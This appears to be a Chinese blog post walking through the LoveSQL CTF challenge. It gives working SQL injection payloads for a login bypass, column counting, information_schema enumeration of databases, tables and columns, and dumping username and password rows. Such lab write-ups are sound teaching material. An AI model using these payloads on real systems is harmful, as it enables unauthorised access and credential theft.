---
title: "[极客大挑战 2019] LoveSQL：UNION 注入的完整流程"
date: 2026-10-22 21:10:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - UNION 注入
  - information_schema
  - 极客大挑战
description: 登录只是开始。用 order by 定列数、找回收显位，再用 UNION SELECT 依次爆库、爆表、爆字段，最后把 flag 拖出来。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 2
permalink: 2026/10/22/web-ctf-sql-lovesql/
---


## 同样的入口，先登录进去

LoveSQL 的登录页和[上一篇 EasySQL](/2026/10/22/web-ctf-sql-easysql-geek/)风格一致：

![LoveSQL 登录页面](06-lovesql-login.png)

*图 6：LoveSQL 登录页*

沿用上一篇的万能密码 `1'||1#`：

```text
基础地址：http://01fc6bfe26018717c5512075.http-ctf2.dasctf.com/check.php
查询参数：?username=1%27%7C%7C1%23&password=1
```

登录成功，但这次页面没有直接给 flag，只回显了管理员信息：

![LoveSQL 登录成功](07-lovesql-admin.png)

*图 7：`Hello admin! Your password is '3c97440bd844baefe62761d8c840cb3f'`*

那串 32 位字符串是 MD5，不是 flag。页面上方还写着"这次我把它们放在了那个地方"，说明 flag 被藏在了数据库里，需要继续查询。

{% note info %}
`Hello admin!` 和 `Your password is '...'` 这两个位置非常关键——它们是页面会**回显**的字段。后面做 `UNION SELECT` 时，要正好把数据放在这两个位置上。
{% endnote %}

## 第二步：数清楚原来查了几列

`UNION` 要求前后两个查询的**列数完全一致**，所以先确定原查询有几列。

**方法一：`ORDER BY`（推荐）**

```text
1' order by 3#
1' order by 4#
```

`order by 3` 正常、`order by 4` 报错，说明原查询是 3 列。

**方法二：直接 `UNION SELECT`**

先猜 1 列：

```text
1' union select 1#
```

页面报错：

![列数不一致报错](09-column-count-error.png)

*图 8：`The used SELECT statements have a different number of columns`*

再试 3 列：

```text
1' union select 1,2,3#
```

![UNION 3 列成功](11-union-echo.png)

*图 9：`Hello 2! Your password is '3'`*

页面显示 `Hello 2!`、`Your password is '3'`，说明：

- 原查询确实是 **3 列**；
- 第 1 列不显示；
- **第 2 列会显示在 `Hello` 后面，第 3 列会显示在 `Your password is` 后面**。

这两列就是我们的"回显位"，后面的查询把数据放到第 2、3 列即可。

{% note warning %}
如果 `UNION` 报的是列数错误，先不要怀疑 payload 写错，优先检查逗号数量和列数是否对应。原查询有 3 列，`union select` 也必须写 3 个值。
{% endnote %}

## 第三步：爆出数据库名

先看当前数据库叫什么：

```text
1' union select 1,database(),3#
```

如果想把所有数据库都列出来，就查 `information_schema.schemata`：

```text
1' union select 1,group_concat(schema_name),3 from information_schema.schemata#
```

![数据库名列表](12-database-names.png)

*图 10：`information_schema,performance_schema,test,mysql,geek`*

其中 `geek` 就是当前业务数据库。`information_schema` 是 MySQL 自带的"元数据库"，里面存着所有库、表、字段的信息，是我们后续爆表、爆字段的关键。

## 第四步：爆出表名

```text
1' union select 1,group_concat(table_name),3
from information_schema.tables
where table_schema=database()#
```

![表名列表](15-table-names.png)

*图 11：当前库中有 `geekuser` 和 `l0ve1ysq1` 两张表*

`l0ve1ysq1` 这个名字明显是出题人留的线索（love + sql），flag 大概率在这张表里。

## 第五步：爆出字段名

```text
1' union select 1,group_concat(column_name),3
from information_schema.columns
where table_schema=database() and table_name='l0ve1ysq1'#
```

![字段名列表](13-column-names.png)

*图 12：字段为 `id,username,password`*

{% note info %}
如果去掉 `and table_name='l0ve1ysq1'` 这个条件，会把 `geekuser` 和 `l0ve1ysq1` 两张表的字段一起查出来，于是看到 `id,username,password,id,username,password` 这样重复的结果——这不是报错，只是两张表字段名恰好一样。
{% endnote %}

## 第六步：把数据拖出来

知道了表名和字段名，直接查：

```text
1' union select 1,group_concat(username,0x3a,password),3 from l0ve1ysq1#
```

![拖库结果](16-dump-result.png)

*图 13：所有用户名和密码被拼成一行显示*

这里用到了两个小技巧：

- `group_concat()`：把多行结果合并成一行，避免页面只显示第一条；
- `0x3a`：十六进制形式的冒号 `:`，用来分隔用户名和密码。直接在单引号里写 `':'` 容易和闭合引号打架，用十六进制更省事。

结果里已经能看到 flag 的尾巴：

```text
...3984-4c7b-882a-6d9f50b61de1}
```

由于页面宽度有限，长字符串可能被 CSS 截断。**按 F12 打开开发者工具**，在 Elements 面板查看对应文本，或者直接在 Console 里执行 `document.body.innerText` 复制完整内容即可。

完整 flag：

```text
CTF2{d4518a67-3984-4c7b-882a-6d9f50b61de1}
```

{% note info %}
如果只想拿 flag，可以更精准一点，直接用条件过滤，避免在一堆数据里找：

```text
1' union select 1,username,password from l0ve1ysq1 where password like 'CTF2%'#
```
{% endnote %}
